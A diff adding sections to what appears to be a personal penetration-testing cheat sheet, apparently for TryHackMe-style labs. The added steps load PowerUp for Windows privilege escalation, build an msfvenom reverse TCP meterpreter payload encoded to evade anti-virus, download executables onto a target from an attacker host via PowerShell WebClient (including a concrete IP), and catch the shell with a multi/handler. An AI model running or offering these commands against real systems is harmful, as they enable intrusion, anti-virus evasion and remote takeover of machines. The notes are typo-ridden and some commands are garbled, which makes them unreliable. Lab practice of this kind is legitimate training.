@@ -51,3 +51,35 @@ load kiwi
 ## Search specific file
 search -f flag*txt
 
+## Load PowerUp
+	# Donwload in the atacker machine
+	- curl -iL https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1 -o PowerUp.ps1
+	- Clean the http headers write in the output file
+
+	# Upload script
+	- Enter in to the meterpreter session
+	- Load powersehell > load powershel
+	- Upload the file > upload [path]/load powershel
+
+	# Run powerup chekcs
+	- . .\PowerUp.ps
+	- Invoke-AllChecks
+
+## Migrate from nc shell to a meterpreter shell
+
+	# Generate the new payload
+	- msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=IP LPORT=PORT -f exe -o shell-name.exe
+
+	- This payload generates an encoded x86-64 reverse TCP meterpreter payload. Payloads are usually encoded to ensure that they are transmitted correctly and also to evade anti-virus products. An anti-virus product may not recognise the payload and won't flag it as malicious.
+
+	# Download from the target machine
+	- powershell "(New-Object System.Net.WebClient).Downloadfile('http://your-thm-ip:8000/shell-name.exe','shell-name.exe')"
+	powershell "(New-Object System.Net.WebClient).Downloadfile('http://10.11.105.59:8443/winPEASx86.exe','winPEASx86.exe')"
+
+	# Prepare the multihandler
+	- use exploit/multi/handler set PAYLOAD windows/meterpreter/reverse_tcp set LHOST your-thm-ip set LPORT listening-port run
+
+	# Start the new shell
+	- Start-Process "shell-name.exe"
+
+
